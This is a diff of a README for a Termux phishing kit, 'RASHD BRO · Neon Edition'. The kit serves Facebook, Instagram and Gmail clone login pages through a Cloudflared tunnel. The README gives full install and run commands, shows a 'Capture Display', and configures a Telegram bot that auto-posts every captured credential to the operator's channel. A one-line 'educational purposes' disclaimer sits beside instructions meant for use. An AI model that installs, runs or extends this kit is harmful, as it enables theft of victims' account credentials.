@@ -1,74 +1,49 @@
-<h1 align="center">
-  <img src="banner.svg" width="800"/>
-</h1>
+# 🔥 RASHD BRO · Neon Edition v3.0
 
-<h3 align="center">🔥 RASHD BRO · Neon Edition v3.0</h3>
-
-<p align="center">
-  <a href="https://github.com/v4zrashd/RASHD-BRO">
-    <img src="https://img.shields.io/badge/version-3.0-%2300c6ff?style=for-the-badge&logo=python&logoColor=white"/>
-  </a>
-  <a href="https://github.com/v4zrashd/RASHD-BRO">
-    <img src="https://img.shields.io/badge/platform-Termux-%230072ff?style=for-the-badge&logo=android&logoColor=white"/>
-  </a>
-  <a href="https://github.com/v4zrashd/RASHD-BRO">
-    <img src="https://img.shields.io/badge/language-Python3-%23ea4335?style=for-the-badge&logo=python&logoColor=white"/>
-  </a>
-  <a href="https://github.com/v4zrashd/RASHD-BRO">
-    <img src="https://img.shields.io/badge/license-Educational-%23fbbc05?style=for-the-badge"/>
-  </a>
-</p>
-
-<p align="center">
-  <img src="https://komarev.com/ghpvc/?username=v4zrashd&label=Profile%20views&color=0e75b6&style=flat" alt="v4zrashd"/>
-</p>
-
-<h2 align="center">⚡ Quick Install</h2>
-
+## ⚡ Quick Install
 ```bash
 git clone https://github.com/v4zrashd/RASHD-BRO.git && cd RASHD-BRO && pip install colorama -q && python3 V4Zteem.py
 ```
 
-<div align="center">
+---
 
-[![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&size=22&duration=3000&pause=1000&color=00c6ff&center=true&vCenter=true&width=600&lines=Welcome+to+RASHD+BRO+Neon+Edition!+;+Phishing+Tool+for+FB+Insta+Mail+!;+Terminal+Mode+Only!;+Made+by+v4zrashd+;)](https://git.io/typing-svg)
-
-</div>
+> **Developer:** v4zrashd
+> **Platform:** Termux (Android) / Linux
+> **Language:** Python 3.14+
+> **Telegram Channel:** Auto-post enabled
 
 ---
 
-<h2 align="center">📊 GitHub Stats</h2>
+## 📋 Full Install Steps
 
-<div align="center">
-
-[![v4zrashd's GitHub stats](https://github-readme-stats.vercel.app/api?username=v4zrashd&show_icons=true&theme=radical&include_all_commits=true&count_private=true&hide_title=true&locale=en)](https://github.com/v4zrashd)
-
-[![Top Langs](https://github-readme-stats.vercel.app/api/top-langs/?username=v4zrashd&theme=radical&layout=compact&hide_title=true)](https://github.com/v4zrashd)
-
-</div>
-
----
-
-<h2 align="center">📋 Complete Installation</h2>
-
-### Termux Setup
+### Step 1: Install Termux
 ```bash
 pkg update && pkg upgrade -y
 pkg install python -y
 pip install colorama -q
+```
+
+### Step 2: Clone & Run
+```bash
 git clone https://github.com/v4zrashd/RASHD-BRO.git
 cd RASHD-BRO
 python3 V4Zteem.py
 ```
 
-### Cloudflared (Optional)
+### Step 3: Install Cloudflared (Optional)
 ```bash
 pkg install cloudflared -y
 ```
 
+### Step 4: Set Telegram Channel (Optional)
+Edit `v4z_config.json`:
+```json
+{"chat_id":"YOUR_CHANNEL_ID","bot_token":"YOUR_BOT_TOKEN","enabled":true}
+```
+
 ---
 
-<h2 align="center">🖥️ Menu Guide</h2>
+## 🖥️ Menu Guide
 
 | Input | Site | Mode | Route |
 |-------|------|------|-------|
@@ -78,7 +53,7 @@ pkg install cloudflared -y
 
 ---
 
-<h2 align="center">📸 Capture Display</h2>
+## 📸 Capture Display
 
 ```
 ═══════════════════════════════════════════════════
@@ -93,7 +68,53 @@ pkg install cloudflared -y
 
 ---
 
-<h2 align="center">🛠️ Troubleshooting</h2>
+## 📡 Telegram Channel
+
+When enabled in `v4z_config.json`, every capture is auto-posted to your Telegram channel.
+
+### Setup
+1. Create bot via [@BotFather](https://t.me/BotFather)
+2. Get bot token
+3. Get channel ID via [@userinfobot](https://t.me/userinfobot)
+4. Edit `v4z_config.json` with both values
+5. Run `python3 V4Zteem.py`
+
+### Status Display
+```
+  📡 Telegram Channel: 🟢 ACTIVE    (when bot_token and chat_id are set)
+  📡 Telegram Channel: 🔴 NO TOKEN  (when bot_token is missing)
+  📡 Telegram Channel: 🔴 OFF       (when chat_id is empty)
+```
+
+---
+
+## 📝 All Commands
+
+### Termux
+```bash
+pkg update && pkg upgrade -y
+pkg install python -y
+pip install colorama -q
+pkg install cloudflared -y
+```
+
+### Git
+```bash
+git clone https://github.com/v4zrashd/RASHD-BRO.git
+cd RASHD-BRO
+git pull origin main
+```
+
+### Python
+```bash
+python3 V4Zteem.py
+pip install colorama -q
+python3 -m py_compile V4Zteem.py
+```
+
+---
+
+## 🛠️ Troubleshooting
 
 | Problem | Solution |
 |---------|----------|
@@ -101,49 +122,36 @@ pkg install cloudflared -y
 | `cloudflared` not found | `pkg install cloudflared -y` |
 | `No free port` | Tool auto-finds next |
 | `Permission denied` | `chmod +x V4Zteem.py` |
+| `Git not found` | `pkg install git -y` |
 
 ---
 
-<h2 align="center">📁 File Structure</h2>
+## 📁 Files
 
 ```
 RASHD-BRO/
-├── 🎬 banner.svg          ← Animated banner
-├── 📊 stats.svg            ← Animated stats
-├── 🚀 V4Zteem.py          ← Main script
-├── 📖 README.md           ← This file
-├── ⚙️ v4z_config.json      ← Config
-├── 🏠 index.html          ← Hub page
-├── 📘 fb.html             ← Facebook clone
-├── 📷 insta.html          ← Instagram clone
-├── 📧 mail.html           ← Gmail clone
-├── 🚪 .gitignore          ← Git rules
-└── 📦 __pycache__/        ← Auto cache
+├── V4Zteem.py          ← Main script
+├── README.md            ← This file
+├── v4z_config.json      ← Config
+├── index.html           ← Hub page
+├── fb.html              ← Facebook clone
+├── insta.html           ← Instagram clone
+├── mail.html            ← Gmail clone
+└── .gitignore           ← Git rules
 ```
 
 ---
 
-<h2 align="center">🔗 Quick Links</h2>
+## 🔒 Legal Disclaimer
 
-<div align="center">
-
-[![License](https://img.shields.io/badge/License-Educational-yellow?style=flat-square)](https://github.com/v4zrashd/RASHD-BRO)
-[![Twitter](https://img.shields.io/badge/Follow-@v4zrashd-1DA1F2?style=flat-square&logo=twitter)](https://twitter.com/v4zrashd)
-[![Profile](https://img.shields.io/badge/Profile-GitHub-24292e?style=flat-square&logo=github)](https://github.com/v4zrashd)
-
-</div>
+> ⚠️ This tool is for educational purposes only.
+> Unauthorized use against others is illegal.
+> Use only on your own systems or with explicit permission.
 
 ---
 
-<div align="center">
+## 📄 License
 
-### 🔥 RASHD BRO · Neon Edition v3.0
-
-Made with ❤️ by **v4zrashd**
-
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="banner.svg">
-  <img alt="RASHD BRO" src="banner.svg" width="400"/>
-</picture>
-
-</div>
+**RASHD BRO · Neon Edition v3.0**
+Developer: v4zrashd
+All rights reserved.
